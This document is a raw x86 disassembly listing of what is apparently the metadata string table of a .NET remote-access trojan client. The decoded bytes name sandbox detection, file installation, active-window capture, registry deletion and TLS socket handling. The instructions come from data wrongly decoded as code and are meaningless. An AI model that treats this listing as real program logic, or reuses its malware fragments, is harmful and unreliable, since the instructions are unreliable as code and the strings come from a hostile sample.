  407bcd:	6e                   	outsb  %ds:(%esi),(%dx)
  407bce:	6e                   	outsb  %ds:(%esi),(%dx)
  407bcf:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  407bd4:	3e 6b 5f 5f 42       	imul   $0x42,%ds:0x5f(%edi),%ebx
  407bd9:	61                   	popa
  407bda:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407bdd:	6e                   	outsb  %ds:(%esi),(%dx)
  407bde:	67 46                	addr16 inc %esi
  407be0:	69 65 6c 64 00 3c 4b 	imul   $0x4b3c0064,0x6c(%ebp),%esp
  407be7:	65 65 70 41          	gs gs jo 0x407c2c
  407beb:	6c                   	insb   (%dx),%es:(%edi)
  407bec:	69 76 65 3e 6b 5f 5f 	imul   $0x5f5f6b3e,0x65(%esi),%esi
  407bf3:	42                   	inc    %edx
  407bf4:	61                   	popa
  407bf5:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407bf8:	6e                   	outsb  %ds:(%esi),(%dx)
  407bf9:	67 46                	addr16 inc %esi
  407bfb:	69 65 6c 64 00 3c 48 	imul   $0x483c0064,0x6c(%ebp),%esp
  407c02:	65 61                	gs popa
  407c04:	64 65 72 53          	fs gs jb 0x407c5b
  407c08:	69 7a 65 3e 6b 5f 5f 	imul   $0x5f5f6b3e,0x65(%edx),%edi
  407c0f:	42                   	inc    %edx
  407c10:	61                   	popa
  407c11:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407c14:	6e                   	outsb  %ds:(%esi),(%dx)
  407c15:	67 46                	addr16 inc %esi
  407c17:	69 65 6c 64 00 3c 50 	imul   $0x503c0064,0x6c(%ebp),%esp
  407c1e:	69 6e 67 3e 6b 5f 5f 	imul   $0x5f5f6b3e,0x67(%esi),%ebp
  407c25:	42                   	inc    %edx
  407c26:	61                   	popa
  407c27:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407c2a:	6e                   	outsb  %ds:(%esi),(%dx)
  407c2b:	67 46                	addr16 inc %esi
  407c2d:	69 65 6c 64 00 3c 41 	imul   $0x413c0064,0x6c(%ebp),%esp
  407c34:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  407c38:	61                   	popa
  407c39:	74 65                	je     0x407ca0
  407c3b:	50                   	push   %eax
  407c3c:	6f                   	outsl  %ds:(%esi),(%dx)
  407c3d:	6e                   	outsb  %ds:(%esi),(%dx)
  407c3e:	67 3e 6b 5f 5f 42    	imul   $0x42,%ds:0x5f(%bx),%ebx
  407c44:	61                   	popa
  407c45:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407c48:	6e                   	outsb  %ds:(%esi),(%dx)
  407c49:	67 46                	addr16 inc %esi
  407c4b:	69 65 6c 64 00 3c 49 	imul   $0x493c0064,0x6c(%ebp),%esp
  407c52:	6e                   	outsb  %ds:(%esi),(%dx)
  407c53:	74 65                	je     0x407cba
  407c55:	72 76                	jb     0x407ccd
  407c57:	61                   	popa
  407c58:	6c                   	insb   (%dx),%es:(%edi)
  407c59:	3e 6b 5f 5f 42       	imul   $0x42,%ds:0x5f(%edi),%ebx
  407c5e:	61                   	popa
  407c5f:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407c62:	6e                   	outsb  %ds:(%esi),(%dx)
  407c63:	67 46                	addr16 inc %esi
  407c65:	69 65 6c 64 00 3c 42 	imul   $0x423c0064,0x6c(%ebp),%esp
  407c6c:	75 66                	jne    0x407cd4
  407c6e:	66 65 72 3e          	data16 gs jb 0x407cb0
  407c72:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  407c76:	61                   	popa
  407c77:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407c7a:	6e                   	outsb  %ds:(%esi),(%dx)
  407c7b:	67 46                	addr16 inc %esi
  407c7d:	69 65 6c 64 00 3c 4f 	imul   $0x4f3c0064,0x6c(%ebp),%esp
  407c84:	66 66 73 65          	data16 data16 jae 0x407ced
  407c88:	74 3e                	je     0x407cc8
  407c8a:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  407c8e:	61                   	popa
  407c8f:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407c92:	6e                   	outsb  %ds:(%esi),(%dx)
  407c93:	67 46                	addr16 inc %esi
  407c95:	69 65 6c 64 00 3c 53 	imul   $0x533c0064,0x6c(%ebp),%esp
  407c9c:	73 6c                	jae    0x407d0a
  407c9e:	43                   	inc    %ebx
  407c9f:	6c                   	insb   (%dx),%es:(%edi)
  407ca0:	69 65 6e 74 3e 6b 5f 	imul   $0x5f6b3e74,0x6e(%ebp),%esp
  407ca7:	5f                   	pop    %edi
  407ca8:	42                   	inc    %edx
  407ca9:	61                   	popa
  407caa:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407cad:	6e                   	outsb  %ds:(%esi),(%dx)
  407cae:	67 46                	addr16 inc %esi
  407cb0:	69 65 6c 64 00 3c 54 	imul   $0x543c0064,0x6c(%ebp),%esp
  407cb7:	63 70 43             	arpl   %esi,0x43(%eax)
  407cba:	6c                   	insb   (%dx),%es:(%edi)
  407cbb:	69 65 6e 74 3e 6b 5f 	imul   $0x5f6b3e74,0x6e(%ebp),%esp
  407cc2:	5f                   	pop    %edi
  407cc3:	42                   	inc    %edx
  407cc4:	61                   	popa
  407cc5:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407cc8:	6e                   	outsb  %ds:(%esi),(%dx)
  407cc9:	67 46                	addr16 inc %esi
  407ccb:	69 65 6c 64 00 49 6e 	imul   $0x6e490064,0x6c(%ebp),%esp
  407cd2:	6e                   	outsb  %ds:(%esi),(%dx)
  407cd3:	65 72 41             	gs jb  0x407d17
  407cd6:	64 64 4d             	fs fs dec %ebp
  407cd9:	61                   	popa
  407cda:	70 43                	jo     0x407d1f
  407cdc:	68 69 6c 64 00       	push   $0x646c69
  407ce1:	49                   	dec    %ecx
  407ce2:	6e                   	outsb  %ds:(%esi),(%dx)
  407ce3:	6e                   	outsb  %ds:(%esi),(%dx)
  407ce4:	65 72 41             	gs jb  0x407d28
  407ce7:	64 64 41             	fs fs inc %ecx
  407cea:	72 72                	jb     0x407d5e
  407cec:	61                   	popa
  407ced:	79 43                	jns    0x407d32
  407cef:	68 69 6c 64 00       	push   $0x646c69
  407cf4:	68 57 6e 64 00       	push   $0x646e57
  407cf9:	53                   	push   %ebx
  407cfa:	65 6e                	outsb  %gs:(%esi),(%dx)
  407cfc:	64 00 41 70          	add    %al,%fs:0x70(%ecx)
  407d00:	70 65                	jo     0x407d67
  407d02:	6e                   	outsb  %ds:(%esi),(%dx)
  407d03:	64 00 52 65          	add    %dl,%fs:0x65(%edx)
  407d07:	67 69 73 74 72 79 56 	imul   $0x61567972,0x74(%bp,%di),%esi
  407d0e:	61 
  407d0f:	6c                   	insb   (%dx),%es:(%edi)
  407d10:	75 65                	jne    0x407d77
  407d12:	4b                   	dec    %ebx
  407d13:	69 6e 64 00 52 65 70 	imul   $0x70655200,0x64(%esi),%ebp
  407d1a:	6c                   	insb   (%dx),%es:(%edi)
  407d1b:	61                   	popa
  407d1c:	63 65 00             	arpl   %esp,0x0(%ebp)
  407d1f:	43                   	inc    %ebx
  407d20:	72 65                	jb     0x407d87
  407d22:	61                   	popa
  407d23:	74 65                	je     0x407d8a
  407d25:	49                   	dec    %ecx
  407d26:	6e                   	outsb  %ds:(%esi),(%dx)
  407d27:	73 74                	jae    0x407d9d
  407d29:	61                   	popa
  407d2a:	6e                   	outsb  %ds:(%esi),(%dx)
  407d2b:	63 65 00             	arpl   %esp,0x0(%ebp)
  407d2e:	73 65                	jae    0x407d95
  407d30:	74 5f                	je     0x407d91
  407d32:	4d                   	dec    %ebp
  407d33:	6f                   	outsl  %ds:(%esi),(%dx)
  407d34:	64 65 00 46 69       	fs add %al,%gs:0x69(%esi)
  407d39:	6c                   	insb   (%dx),%es:(%edi)
  407d3a:	65 4d                	gs dec %ebp
  407d3c:	6f                   	outsl  %ds:(%esi),(%dx)
  407d3d:	64 65 00 50 61       	fs add %dl,%gs:0x61(%eax)
  407d42:	64 64 69 6e 67 4d 6f 	fs imul $0x65646f4d,%fs:0x67(%esi),%ebp
  407d49:	64 65 
  407d4b:	00 45 6e             	add    %al,0x6e(%ebp)
  407d4e:	74 65                	je     0x407db5
  407d50:	72 44                	jb     0x407d96
  407d52:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  407d56:	4d                   	dec    %ebp
  407d57:	6f                   	outsl  %ds:(%esi),(%dx)
  407d58:	64 65 00 43 72       	fs add %al,%gs:0x72(%ebx)
  407d5d:	79 70                	jns    0x407dcf
  407d5f:	74 6f                	je     0x407dd0
  407d61:	53                   	push   %ebx
  407d62:	74 72                	je     0x407dd6
  407d64:	65 61                	gs popa
  407d66:	6d                   	insl   (%dx),%es:(%edi)
  407d67:	4d                   	dec    %ebp
  407d68:	6f                   	outsl  %ds:(%esi),(%dx)
  407d69:	64 65 00 43 6f       	fs add %al,%gs:0x6f(%ebx)
  407d6e:	6d                   	insl   (%dx),%es:(%edi)
  407d6f:	70 72                	jo     0x407de3
  407d71:	65 73 73             	gs jae 0x407de7
  407d74:	69 6f 6e 4d 6f 64 65 	imul   $0x65646f4d,0x6e(%edi),%ebp
  407d7b:	00 43 69             	add    %al,0x69(%ebx)
  407d7e:	70 68                	jo     0x407de8
  407d80:	65 72 4d             	gs jb  0x407dd0
  407d83:	6f                   	outsl  %ds:(%esi),(%dx)
  407d84:	64 65 00 53 65       	fs add %dl,%gs:0x65(%ebx)
  407d89:	6c                   	insb   (%dx),%es:(%edi)
  407d8a:	65 63 74 4d 6f       	arpl   %esi,%gs:0x6f(%ebp,%ecx,2)
  407d8f:	64 65 00 75 74       	fs add %dh,%gs:0x74(%ebp)
  407d94:	66 38 45 6e          	data16 cmp %al,0x6e(%ebp)
  407d98:	63 6f 64             	arpl   %ebp,0x64(%edi)
  407d9b:	65 00 44 65 6c       	add    %al,%gs:0x6c(%ebp,%eiz,2)
  407da0:	65 74 65             	gs je  0x407e08
  407da3:	53                   	push   %ebx
  407da4:	75 62                	jne    0x407e08
  407da6:	4b                   	dec    %ebx
  407da7:	65 79 54             	gs jns 0x407dfe
  407daa:	72 65                	jb     0x407e11
  407dac:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407db0:	74 5f                	je     0x407e11
  407db2:	4d                   	dec    %ebp
  407db3:	65 73 73             	gs jae 0x407e29
  407db6:	61                   	popa
  407db7:	67 65 00 44 65       	add    %al,%gs:0x65(%si)
  407dbc:	74 65                	je     0x407e23
  407dbe:	63 74 53 61          	arpl   %esi,0x61(%ebx,%edx,2)
  407dc2:	6e                   	outsb  %ds:(%esi),(%dx)
  407dc3:	64 62 6f 78          	bound  %ebp,%fs:0x78(%edi)
  407dc7:	69 65 00 49 6e 76 6f 	imul   $0x6f766e49,0x0(%ebp),%esp
  407dce:	6b 65 00 49          	imul   $0x49,0x0(%ebp),%esp
  407dd2:	45                   	inc    %ebp
  407dd3:	6e                   	outsb  %ds:(%esi),(%dx)
  407dd4:	75 6d                	jne    0x407e43
  407dd6:	65 72 61             	gs jb  0x407e3a
  407dd9:	62 6c 65 00          	bound  %ebp,0x0(%ebp,%eiz,2)
  407ddd:	49                   	dec    %ecx
  407dde:	44                   	inc    %esp
  407ddf:	69 73 70 6f 73 61 62 	imul   $0x6261736f,0x70(%ebx),%esi
  407de6:	6c                   	insb   (%dx),%es:(%edi)
  407de7:	65 00 54 6f 44       	add    %dl,%gs:0x44(%edi,%ebp,2)
  407dec:	6f                   	outsl  %ds:(%esi),(%dx)
  407ded:	75 62                	jne    0x407e51
  407def:	6c                   	insb   (%dx),%es:(%edi)
  407df0:	65 00 53 77          	add    %dl,%gs:0x77(%ebx)
  407df4:	61                   	popa
  407df5:	70 44                	jo     0x407e3b
  407df7:	6f                   	outsl  %ds:(%esi),(%dx)
  407df8:	75 62                	jne    0x407e5c
  407dfa:	6c                   	insb   (%dx),%es:(%edi)
  407dfb:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407dff:	74 5f                	je     0x407e60
  407e01:	48                   	dec    %eax
  407e02:	61                   	popa
  407e03:	6e                   	outsb  %ds:(%esi),(%dx)
  407e04:	64 6c                	fs insb (%dx),%es:(%edi)
  407e06:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  407e0a:	6e                   	outsb  %ds:(%esi),(%dx)
  407e0b:	74 69                	je     0x407e76
  407e0d:	6d                   	insl   (%dx),%es:(%edi)
  407e0e:	65 46                	gs inc %esi
  407e10:	69 65 6c 64 48 61 6e 	imul   $0x6e614864,0x6c(%ebp),%esp
  407e17:	64 6c                	fs insb (%dx),%es:(%edi)
  407e19:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  407e1d:	74 4d                	je     0x407e6c
  407e1f:	6f                   	outsl  %ds:(%esi),(%dx)
  407e20:	64 75 6c             	fs jne 0x407e8f
  407e23:	65 48                	gs dec %eax
  407e25:	61                   	popa
  407e26:	6e                   	outsb  %ds:(%esi),(%dx)
  407e27:	64 6c                	fs insb (%dx),%es:(%edi)
  407e29:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  407e2d:	6e                   	outsb  %ds:(%esi),(%dx)
  407e2e:	74 69                	je     0x407e99
  407e30:	6d                   	insl   (%dx),%es:(%edi)
  407e31:	65 54                	gs push %esp
  407e33:	79 70                	jns    0x407ea5
  407e35:	65 48                	gs dec %eax
  407e37:	61                   	popa
  407e38:	6e                   	outsb  %ds:(%esi),(%dx)
  407e39:	64 6c                	fs insb (%dx),%es:(%edi)
  407e3b:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  407e3f:	74 54                	je     0x407e95
  407e41:	79 70                	jns    0x407eb3
  407e43:	65 46                	gs inc %esi
  407e45:	72 6f                	jb     0x407eb6
  407e47:	6d                   	insl   (%dx),%es:(%edi)
  407e48:	48                   	dec    %eax
  407e49:	61                   	popa
  407e4a:	6e                   	outsb  %ds:(%esi),(%dx)
  407e4b:	64 6c                	fs insb (%dx),%es:(%edi)
  407e4d:	65 00 57 61          	add    %dl,%gs:0x61(%edi)
  407e51:	69 74 48 61 6e 64 6c 	imul   $0x656c646e,0x61(%eax,%ecx,2),%esi
  407e58:	65 
  407e59:	00 57 72             	add    %dl,0x72(%edi)
  407e5c:	69 74 65 53 69 6e 67 	imul   $0x6c676e69,0x53(%ebp,%eiz,2),%esi
  407e63:	6c 
  407e64:	65 00 54 6f 53       	add    %dl,%gs:0x53(%edi,%ebp,2)
  407e69:	69 6e 67 6c 65 00 53 	imul   $0x5300656c,0x67(%esi),%ebp
  407e70:	65 74 41             	gs je  0x407eb4
  407e73:	73 53                	jae    0x407ec8
  407e75:	69 6e 67 6c 65 00 49 	imul   $0x4900656c,0x67(%esi),%ebp
  407e7c:	6e                   	outsb  %ds:(%esi),(%dx)
  407e7d:	73 74                	jae    0x407ef3
  407e7f:	61                   	popa
  407e80:	6c                   	insb   (%dx),%es:(%edi)
  407e81:	6c                   	insb   (%dx),%es:(%edi)
  407e82:	46                   	inc    %esi
  407e83:	69 6c 65 00 44 65 63 	imul   $0x6f636544,0x0(%ebp,%eiz,2),%ebp
  407e8a:	6f 
  407e8b:	64 65 46             	fs gs inc %esi
  407e8e:	72 6f                	jb     0x407eff
  407e90:	6d                   	insl   (%dx),%es:(%edi)
  407e91:	46                   	inc    %esi
  407e92:	69 6c 65 00 53 61 76 	imul   $0x65766153,0x0(%ebp,%eiz,2),%ebp
  407e99:	65 
  407e9a:	42                   	inc    %edx
  407e9b:	79 74                	jns    0x407f11
  407e9d:	65 73 54             	gs jae 0x407ef4
  407ea0:	6f                   	outsl  %ds:(%esi),(%dx)
  407ea1:	46                   	inc    %esi
  407ea2:	69 6c 65 00 49 73 49 	imul   $0x6e497349,0x0(%ebp,%eiz,2),%ebp
  407ea9:	6e 
  407eaa:	52                   	push   %edx
  407eab:	6f                   	outsl  %ds:(%esi),(%dx)
  407eac:	6c                   	insb   (%dx),%es:(%edi)
  407ead:	65 00 57 69          	add    %dl,%gs:0x69(%edi)
  407eb1:	6e                   	outsb  %ds:(%esi),(%dx)
  407eb2:	64 6f                	outsl  %fs:(%esi),(%dx)
  407eb4:	77 73                	ja     0x407f29
  407eb6:	42                   	inc    %edx
  407eb7:	75 69                	jne    0x407f22
  407eb9:	6c                   	insb   (%dx),%es:(%edi)
  407eba:	74 49                	je     0x407f05
  407ebc:	6e                   	outsb  %ds:(%esi),(%dx)
  407ebd:	52                   	push   %edx
  407ebe:	6f                   	outsl  %ds:(%esi),(%dx)
  407ebf:	6c                   	insb   (%dx),%es:(%edi)
  407ec0:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  407ec4:	74 41                	je     0x407f07
  407ec6:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  407eca:	65 57                	gs push %edi
  407ecc:	69 6e 64 6f 77 54 69 	imul   $0x6954776f,0x64(%esi),%ebp
  407ed3:	74 6c                	je     0x407f41
  407ed5:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407ed9:	74 5f                	je     0x407f3a
  407edb:	4d                   	dec    %ebp
  407edc:	61                   	popa
  407edd:	69 6e 4d 6f 64 75 6c 	imul   $0x6c75646f,0x4d(%esi),%ebp
  407ee4:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  407ee8:	6f                   	outsl  %ds:(%esi),(%dx)
  407ee9:	63 65 73             	arpl   %esp,0x73(%ebp)
  407eec:	73 4d                	jae    0x407f3b
  407eee:	6f                   	outsl  %ds:(%esi),(%dx)
  407eef:	64 75 6c             	fs jne 0x407f5e
  407ef2:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  407ef6:	74 5f                	je     0x407f57
  407ef8:	57                   	push   %edi
  407ef9:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%esi),%ebp
  407f00:	79 6c                	jns    0x407f6e
  407f02:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  407f06:	6f                   	outsl  %ds:(%esi),(%dx)
  407f07:	63 65 73             	arpl   %esp,0x73(%ebp)
  407f0a:	73 57                	jae    0x407f63
  407f0c:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%esi),%ebp
  407f13:	79 6c                	jns    0x407f81
  407f15:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407f19:	74 5f                	je     0x407f7a
  407f1b:	4e                   	dec    %esi
  407f1c:	61                   	popa
  407f1d:	6d                   	insl   (%dx),%es:(%edi)
  407f1e:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407f22:	74 5f                	je     0x407f83
  407f24:	46                   	inc    %esi
  407f25:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  407f2c:	00 
  407f2d:	73 65                	jae    0x407f94
  407f2f:	74 5f                	je     0x407f90
  407f31:	46                   	inc    %esi
  407f32:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  407f39:	00 
  407f3a:	47                   	inc    %edi
  407f3b:	65 74 54             	gs je  0x407f92
  407f3e:	65 6d                	gs insl (%dx),%es:(%edi)
  407f40:	70 46                	jo     0x407f88
  407f42:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  407f49:	00 
  407f4a:	47                   	inc    %edi
  407f4b:	65 74 46             	gs je  0x407f94
  407f4e:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  407f55:	00 
  407f56:	66 69 6c 65 4e 61 6d 	imul   $0x6d61,0x4e(%ebp,%eiz,2),%bp
  407f5d:	65 00 6c 70 4d       	add    %ch,%gs:0x4d(%eax,%esi,2)
  407f62:	6f                   	outsl  %ds:(%esi),(%dx)
  407f63:	64 75 6c             	fs jne 0x407fd2
  407f66:	65 4e                	gs dec %esi
  407f68:	61                   	popa
  407f69:	6d                   	insl   (%dx),%es:(%edi)
  407f6a:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407f6e:	74 5f                	je     0x407fcf
  407f70:	4d                   	dec    %ebp
  407f71:	61                   	popa
  407f72:	63 68 69             	arpl   %ebp,0x69(%eax)
  407f75:	6e                   	outsb  %ds:(%esi),(%dx)
  407f76:	65 4e                	gs dec %esi
  407f78:	61                   	popa
  407f79:	6d                   	insl   (%dx),%es:(%edi)
  407f7a:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407f7e:	74 5f                	je     0x407fdf
  407f80:	4f                   	dec    %edi
  407f81:	53                   	push   %ebx
  407f82:	46                   	inc    %esi
  407f83:	75 6c                	jne    0x407ff1
  407f85:	6c                   	insb   (%dx),%es:(%edi)
  407f86:	4e                   	dec    %esi
  407f87:	61                   	popa
  407f88:	6d                   	insl   (%dx),%es:(%edi)
  407f89:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407f8d:	74 5f                	je     0x407fee
  407f8f:	46                   	inc    %esi
  407f90:	75 6c                	jne    0x407ffe
  407f92:	6c                   	insb   (%dx),%es:(%edi)
  407f93:	4e                   	dec    %esi
  407f94:	61                   	popa
  407f95:	6d                   	insl   (%dx),%es:(%edi)
  407f96:	65 00 49 73          	add    %cl,%gs:0x73(%ecx)
  407f9a:	56                   	push   %esi
  407f9b:	61                   	popa
  407f9c:	6c                   	insb   (%dx),%es:(%edi)
  407f9d:	69 64 44 6f 6d 61 69 	imul   $0x6e69616d,0x6f(%esp,%eax,2),%esp
  407fa4:	6e 
  407fa5:	4e                   	dec    %esi
  407fa6:	61                   	popa
  407fa7:	6d                   	insl   (%dx),%es:(%edi)
  407fa8:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407fac:	74 5f                	je     0x40800d
  407fae:	55                   	push   %ebp
  407faf:	73 65                	jae    0x408016
  407fb1:	72 4e                	jb     0x408001
  407fb3:	61                   	popa
  407fb4:	6d                   	insl   (%dx),%es:(%edi)
  407fb5:	65 00 6c 6f 77       	add    %ch,%gs:0x77(%edi,%ebp,2)
  407fba:	65 72 4e             	gs jb  0x40800b
  407fbd:	61                   	popa
  407fbe:	6d                   	insl   (%dx),%es:(%edi)
  407fbf:	65 00 53 65          	add    %dl,%gs:0x65(%ebx)
  407fc3:	74 4e                	je     0x408013
  407fc5:	61                   	popa
  407fc6:	6d                   	insl   (%dx),%es:(%edi)
  407fc7:	65 00 43 68          	add    %al,%gs:0x68(%ebx)
  407fcb:	65 63 6b 48          	arpl   %ebp,%gs:0x48(%ebx)
  407fcf:	6f                   	outsl  %ds:(%esi),(%dx)
  407fd0:	73 74                	jae    0x408046
  407fd2:	4e                   	dec    %esi
  407fd3:	61                   	popa
  407fd4:	6d                   	insl   (%dx),%es:(%edi)
  407fd5:	65 00 6e 61          	add    %ch,%gs:0x61(%esi)
  407fd9:	6d                   	insl   (%dx),%es:(%edi)
  407fda:	65 00 44 61 74       	add    %al,%gs:0x74(%ecx,%eiz,2)
  407fdf:	65 54                	gs push %esp
  407fe1:	69 6d 65 00 67 65 74 	imul   $0x74656700,0x65(%ebp),%ebp
  407fe8:	5f                   	pop    %edi
  407fe9:	4c                   	dec    %esp
  407fea:	61                   	popa
  407feb:	73 74                	jae    0x408061
  407fed:	57                   	push   %edi
  407fee:	72 69                	jb     0x408059
  407ff0:	74 65                	je     0x408057
  407ff2:	54                   	push   %esp
  407ff3:	69 6d 65 00 54 6f 55 	imul   $0x556f5400,0x65(%ebp),%ebp
  407ffa:	6e                   	outsb  %ds:(%esi),(%dx)
  407ffb:	69 76 65 72 73 61 6c 	imul   $0x6c617372,0x65(%esi),%esi
  408002:	54                   	push   %esp
  408003:	69 6d 65 00 57 72 69 	imul   $0x69725700,0x65(%ebp),%ebp
  40800a:	74 65                	je     0x408071
  40800c:	4c                   	dec    %esp
  40800d:	69 6e 65 00 43 6f 6d 	imul   $0x6d6f4300,0x65(%esi),%ebp
  408014:	62 69 6e             	bound  %ebp,0x6e(%ecx)
  408017:	65 00 55 72          	add    %dl,%gs:0x72(%ebp)
  40801b:	69 48 6f 73 74 4e 61 	imul   $0x614e7473,0x6f(%eax),%ecx
  408022:	6d                   	insl   (%dx),%es:(%edi)
  408023:	65 54                	gs push %esp
  408025:	79 70                	jns    0x408097
  408027:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  40802b:	74 5f                	je     0x40808c
  40802d:	56                   	push   %esi
  40802e:	61                   	popa
  40802f:	6c                   	insb   (%dx),%es:(%edi)
  408030:	75 65                	jne    0x408097
  408032:	54                   	push   %esp
  408033:	79 70                	jns    0x4080a5
  408035:	65 00 76 61          	add    %dh,%gs:0x61(%esi)
  408039:	6c                   	insb   (%dx),%es:(%edi)
  40803a:	75 65                	jne    0x4080a1
  40803c:	54                   	push   %esp
  40803d:	79 70                	jns    0x4080af
  40803f:	65 00 4d 73          	add    %cl,%gs:0x73(%ebp)
  408043:	67 50                	addr16 push %eax
  408045:	61                   	popa
  408046:	63 6b 54             	arpl   %ebp,0x54(%ebx)
  408049:	79 70                	jns    0x4080bb
  40804b:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  40804f:	6f                   	outsl  %ds:(%esi),(%dx)
  408050:	74 6f                	je     0x4080c1
  408052:	63 6f 6c             	arpl   %ebp,0x6c(%edi)
  408055:	54                   	push   %esp
  408056:	79 70                	jns    0x4080c8
  408058:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  40805c:	74 54                	je     0x4080b2
  40805e:	79 70                	jns    0x4080d0
  408060:	65 00 53 6f          	add    %dl,%gs:0x6f(%ebx)
  408064:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  408067:	74 54                	je     0x4080bd
  408069:	79 70                	jns    0x4080db
  40806b:	65 00 46 69          	add    %al,%gs:0x69(%esi)
  40806f:	6c                   	insb   (%dx),%es:(%edi)
  408070:	65 53                	gs push %ebx
  408072:	68 61 72 65 00       	push   $0x657261
  408077:	53                   	push   %ebx
  408078:	79 73                	jns    0x4080ed
  40807a:	74 65                	je     0x4080e1
  40807c:	6d                   	insl   (%dx),%es:(%edi)
  40807d:	2e 43                	cs inc %ebx
  40807f:	6f                   	outsl  %ds:(%esi),(%dx)
  408080:	72 65                	jb     0x4080e7
  408082:	00 53 65             	add    %dl,0x65(%ebx)
  408085:	72 76                	jb     0x4080fd
  408087:	65 72 73             	gs jb  0x4080fd
  40808a:	69 67 6e 61 74 75 72 	imul   $0x72757461,0x6e(%edi),%esp
  408091:	65 00 43 6c          	add    %al,%gs:0x6c(%ebx)
  408095:	6f                   	outsl  %ds:(%esi),(%dx)
  408096:	73 65                	jae    0x4080fd
  408098:	00 44 69 73          	add    %al,0x73(%ecx,%ebp,2)
  40809c:	70 6f                	jo     0x40810d
  40809e:	73 65                	jae    0x408105
  4080a0:	00 50 61             	add    %dl,0x61(%eax)
  4080a3:	72 73                	jb     0x408118
  4080a5:	65 00 53 74          	add    %dl,%gs:0x74(%ebx)
  4080a9:	72 52                	jb     0x4080fd
  4080ab:	65 76 65             	gs jbe 0x408113
  4080ae:	72 73                	jb     0x408123
  4080b0:	65 00 58 35          	add    %bl,%gs:0x35(%eax)
  4080b4:	30 39                	xor    %bh,(%ecx)
  4080b6:	43                   	inc    %ebx
  4080b7:	65 72 74             	gs jb  0x40812e
  4080ba:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  4080c1:	00 56 61             	add    %dl,0x61(%esi)
  4080c4:	6c                   	insb   (%dx),%es:(%edi)
  4080c5:	69 64 61 74 65 53 65 	imul   $0x72655365,0x74(%ecx,%eiz,2),%esp
  4080cc:	72 
  4080cd:	76 65                	jbe    0x408134
  4080cf:	72 43                	jb     0x408114
  4080d1:	65 72 74             	gs jb  0x408148
  4080d4:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  4080db:	00 63 65             	add    %ah,0x65(%ebx)
  4080de:	72 74                	jb     0x408154
  4080e0:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  4080e7:	00 43 72             	add    %al,0x72(%ebx)
  4080ea:	65 61                	gs popa
  4080ec:	74 65                	je     0x408153
  4080ee:	00 53 65             	add    %dl,0x65(%ebx)
  4080f1:	74 54                	je     0x408147
  4080f3:	68 72 65 61 64       	push   $0x64616572
  4080f8:	45                   	inc    %ebp
  4080f9:	78 65                	js     0x408160
  4080fb:	63 75 74             	arpl   %esi,0x74(%ebp)
  4080fe:	69 6f 6e 53 74 61 74 	imul   $0x74617453,0x6e(%edi),%ebp
  408105:	65 00 44 65 6c       	add    %al,%gs:0x6c(%ebp,%eiz,2)
  40810a:	65 74 65             	gs je  0x408172
  40810d:	00 43 61             	add    %al,0x61(%ebx)
  408110:	6c                   	insb   (%dx),%es:(%edi)
  408111:	6c                   	insb   (%dx),%es:(%edi)
  408112:	53                   	push   %ebx
  408113:	69 74 65 00 57 72 69 	imul   $0x74697257,0x0(%ebp,%eiz,2),%esi
  40811a:	74 
  40811b:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  40811f:	6d                   	insl   (%dx),%es:(%edi)
  408120:	70 69                	jo     0x40818b
  408122:	6c                   	insb   (%dx),%es:(%edi)
  408123:	65 72 47             	gs jb  0x40816d
  408126:	65 6e                	outsb  %gs:(%esi),(%dx)
  408128:	65 72 61             	gs jb  0x40818c
  40812b:	74 65                	je     0x408192
  40812d:	64 41                	fs inc %ecx
  40812f:	74 74                	je     0x4081a5
  408131:	72 69                	jb     0x40819c
  408133:	62 75 74             	bound  %esi,0x74(%ebp)
  408136:	65 00 44 65 62       	add    %al,%gs:0x62(%ebp,%eiz,2)
  40813b:	75 67                	jne    0x4081a4
  40813d:	67 61                	addr16 popa
